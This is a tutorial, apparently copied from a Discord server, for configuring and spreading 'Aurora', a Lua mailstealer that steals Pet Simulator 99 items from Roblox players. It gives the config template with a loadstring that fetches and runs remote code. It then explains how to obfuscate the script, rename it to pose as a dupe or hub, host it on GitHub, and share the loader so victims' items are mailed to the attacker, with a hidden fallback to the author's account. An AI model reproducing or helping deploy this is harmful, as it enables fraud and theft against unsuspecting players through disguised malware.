# I had made a tutorial for my mailstealer (for pet simulator99) [Aurora](https://discord.gg/Eh7EX6dzAF) feel free to join my server, do not run anything you see here you will lose your stuf!!! this is a direct copy and paste of my tutorial from the discord
Alright chat this is a tutorial  
Since everyone's stupid and can't understand lua 😭  
And I don't have the resources to host a 24/7 mailsteal creator bot So here's a tutorial So I'll be explaining most of the shit  
# 1 getting your webhook
video tutorial below:  
[![Click me!](https://img.youtube.com/vi/video-id/0.jpg)](https://github.com/Enivzoy/Aurora/raw/main/pics/webhook.mp4)  
From my [partner<3](https://discord.gg/CxhY6rpUCA)  
  
Cant download? Try this Instead  

Create A new discord server  
![image](https://github.com/Enivzoy/Aurora/assets/130647229/52323e22-8b40-4ae5-8be5-b35579bc0e27)  
Name it whatever you want it doesnt matter  
![image](https://github.com/Enivzoy/Aurora/assets/130647229/0e446427-0d39-46c9-be2f-3a276d2ad3a7)  
edit your general channel  
![image](https://github.com/Enivzoy/Aurora/assets/130647229/18304642-97cc-465a-9117-8a97d6b7cccf)  
go to integrations  
![image](https://github.com/Enivzoy/Aurora/assets/130647229/818412ec-e331-4353-8d55-95f81cad3e66)  
then click create a webhook  
![image](https://github.com/Enivzoy/Aurora/assets/130647229/8448d93c-1328-4f44-8739-752fec73d0ab)  
by default you should see a spidey bot  
![image](https://github.com/Enivzoy/Aurora/assets/130647229/04880695-ae31-4c91-947f-29f6f6925f3c)  
Click copy webhook url and ur done  
![image](https://github.com/Enivzoy/Aurora/assets/130647229/f5b0b964-2030-47b0-b407-7bd9286f9492)  



# 2: setting up the lua code

Get the script from ⁠[script channel from discord](https://discord.com/channels/1226830019939143690/1227851051634266193)
It should look like this:
```lua
Username = "your user here"
Username2 = "your 2nd user here" -- stuff will get sent to this user if first user's mailbox is full
Webhook = "your webhook here"
min_rap = 500000 -- minimum rap of each item you want to get sent to you.

keySystemEnabled = true -- wether you want to enable key system or not
hubName = "Hubname | Keysystem" -- self explain
keyLink = "https://example.com/" -- the link wehere yoi cam get your keys this can be a discord invite
keys = {"key1", "key2", "andsoon"} -- the keys for your key system

loadstring(game:HttpGet('https://raw.githubusercontent.com/Enivzoy/Utilz/main/lua/rblx/AuroraTils/mainframe'))()
```
Now I will update the script more  
So don't copy the script from here incase a major rewrite/bugs go join the [discord](https://discord.gg/Eh7EX6dzAF) for updated script  
So as per [update 4.6/keysystem1.2](https://discord.com/channels/1226830019939143690/1227851051634266193/1240374560046714910) the script is updated   
Make sure you have a ps99 account which can receive mail, Aka must have reached area 10. It's better to use a alt account (or 2 alt accounts incase you get banned)  
So the `Username` should be your username for like the account to receive the mail  
For example `Username = "GetAuroraMS"`  
Now here's the tricky part  
If you have an alt  
You need to fill in the `Username2` also  
If you happen to have your mains mailbox full it will send to username2  
Now if this value(Username2) is kept empty/removed then it'll be set to my ign(only if the value is empty or removed completely) to avoid errors(no this isn't dualhooking, it's a failsafe)  
~~If I'm nice I might return the items~~  
Now the webhook, You should've gotten the webhook from step 1 So put it to the `Webhook` value  
For example `Webhook = "discord.com/x/x`  
  
Now minimum rap, Minimum rap means the item has to be the same or above the rap you put into the script   
  
Now let's say you have min rap to about 1m, And you hit a guy with 500k
You won't get anything because the min rap is 1m  
Now minrap is calculated based on whole numbers(no "m" or "k" if it's 6k then it should be 6000 if it's 1m then it should be 1000000)  
So if your into the high stuff  
Set your min rap to 1-3m  
# key system (ohh boi this gon be hard to explain(i think so?))  
So key system is like a gui that opens when you run the script  
You can enable this (it's enabled by default) by setting the `keySystemEnabled` value to true  
If you dont want key system  
Just set it to false `keySystemEnabled = false`  
Or remove everything related to it (keySystemEnabled, hubName, keyLink, keys !!!!DO NOT TOUCH THE LOADSTRING!!!!)  
I think you can figure rest of the stuff out  
now after doing everything you save your script to a file call it mailsetaler.txt and save it somewhere(using notepad or a file editor) then go to step 3(part2)  
Make sure to [DM](https://discord.gg/Eh7EX6dzAF) me if you cant follow something  I'll help you   
  
# 3: obfuscation & uploading
Now you gotta obfuscate your bot so people don't spam your webhook  
I'll be showing you how to use moonsec in this tutorial  
aight  
so first you gotta join **[moonsex](https://discord.gg/2Eah77h8KC)**  
you dm this bot  
![image](https://github.com/Enivzoy/Aurora/assets/130647229/614c946d-1b90-4070-9713-3aff416ad181)  
then you send the file you saved(mailsetaler.txt - ⁠[#tutorial-since-stupid⁠](https://discord.com/channels/1226830019939143690/1240373088063983767/1240376735581601934)) to the bot  
you will see smth like this  
![image](https://github.com/Enivzoy/Aurora/assets/130647229/ba5a7b3c-6d6e-41f5-9731-30eff687b29e)  
click this   
![image](https://github.com/Enivzoy/Aurora/assets/130647229/7852cefd-17f3-4808-8b96-72e3c1fd1470)   
then you click this  
![image](https://github.com/Enivzoy/Aurora/assets/130647229/30c3c77e-a9ad-47b2-bf5f-757a62226c99)  
it should look like this now  
![image](https://github.com/Enivzoy/Aurora/assets/130647229/dba1dd35-2c3f-42de-b1b2-01b8b975daf3)  
then click all of these  
![image](https://github.com/Enivzoy/Aurora/assets/130647229/0fb68965-064c-45e9-ae9b-7b5dc71f45bb)  
then click obfuscate  
![image](https://github.com/Enivzoy/Aurora/assets/130647229/4d17cc43-574c-488c-a72b-b1f3fdcb9690)  
it willl show this embed click on the **[Click Here]** to download the file  
![image](https://github.com/Enivzoy/Aurora/assets/130647229/d0202540-2646-4475-8a05-f2c6b2cef77f)  
you will have to do a linkvertise  
once you get your file(THIS WILL BE DIFFERENT FOR EVERYONE)  
![image](https://github.com/Enivzoy/Aurora/assets/130647229/8aa2dd5f-b35d-4a46-b239-366481d74d2b)  
rename it to something else like "loader" "exec" "dupe" "tradescam" "arkohub", "aurorahub" etc etc
![image](https://github.com/Enivzoy/Aurora/assets/130647229/32598d66-be6d-41d3-96f7-090ab96dd1e9)
# Now uploading
create your account at [github](https://github.com/)  
your homepage should look like this  
![image](https://github.com/Enivzoy/Aurora/assets/130647229/467c470e-2fea-46dd-9d8f-811f8d354d60)  
click this  
![image](https://github.com/Enivzoy/Aurora/assets/130647229/e36259f7-965a-41bd-b855-d0cdebfba9ed)  
click new repository  
![image](https://github.com/Enivzoy/Aurora/assets/130647229/0782fd97-53b3-4633-a9a0-b7c383d7fa00)  
it will open this page  
![image](https://github.com/Enivzoy/Aurora/assets/130647229/2c3b7233-b389-4c4f-b918-97fbed434492)  
click create repo after filling in everything  
![image](https://github.com/Enivzoy/Aurora/assets/130647229/8146420e-d331-4175-a5a6-183270456be8)  
it will now show this   
![image](https://github.com/Enivzoy/Aurora/assets/130647229/c36db808-0252-477f-a763-bda51feb6da5)  
click uploading an existing file  
![image](https://github.com/Enivzoy/Aurora/assets/130647229/65ce8aed-6b7f-49bd-9200-ed460b265f27)  
it will open this  
![image](https://github.com/Enivzoy/Aurora/assets/130647229/a744f62c-e5d8-4728-86cd-2f1fb47042a3)  
find where you had saved your file ([#⁠tutorial-since-stupid](https://discord.com/channels/1226830019939143690/1240373088063983767/1240556624561832037)⁠ TILL⁠ [#tutorial-since-stupid⁠](https://discord.com/channels/1226830019939143690/1240373088063983767/1240557422091698176)) for me its loader saved in downloads folder  
![image](https://github.com/Enivzoy/Aurora/assets/130647229/0df73a16-4f5b-4372-944d-4c44485a0d7d)  
drag and drop your file  
![image](https://github.com/Enivzoy/Aurora/assets/130647229/859fe5e9-cf57-4530-bdb7-2eb17931acdd)  
once uploaded click commit changes  
![image](https://github.com/Enivzoy/Aurora/assets/130647229/690a548f-1d3d-4685-9ecc-68ea0c0e2f71)  
if youve done everything right to this point it should look like this  
![image](https://github.com/Enivzoy/Aurora/assets/130647229/476a12f6-2bf9-4262-8346-f0525c82275b)  
click your file  
![image](https://github.com/Enivzoy/Aurora/assets/130647229/8f64d269-0764-4c5b-8f35-0f716d4ddcaa)  
it should open this up, then click raw  
![image](https://github.com/Enivzoy/Aurora/assets/130647229/a4427ac1-3f2d-4e53-a4a1-4800e338f9fe)  
you will see this mess  
![image](https://github.com/Enivzoy/Aurora/assets/130647229/eb6404dd-0960-4d03-9a61-722eb23c128b)  
copy the url for me it is https://raw.githubusercontent.com/Enivzoy/Aurora/main/loader  
![image](https://github.com/Enivzoy/Aurora/assets/130647229/ea75ed82-8545-44f4-ac3c-4798eee14153)   
then you put the raw link into a loadstring  
`loadstring(game:HttpGet('RAW LINK HERE'))()`  
for me it is `loadstring(game:HttpGet('https://raw.githubusercontent.com/Enivzoy/Aurora/main/loader'))()`  
  
  
now you share the script  
and porfit  
profit  
make sure to dm me your profits  
so i can advertise it 👍  
if you dont understand something make sure to dmme  
# thanks to my discord server, arko and levox and future partners for providing me with resources and etc
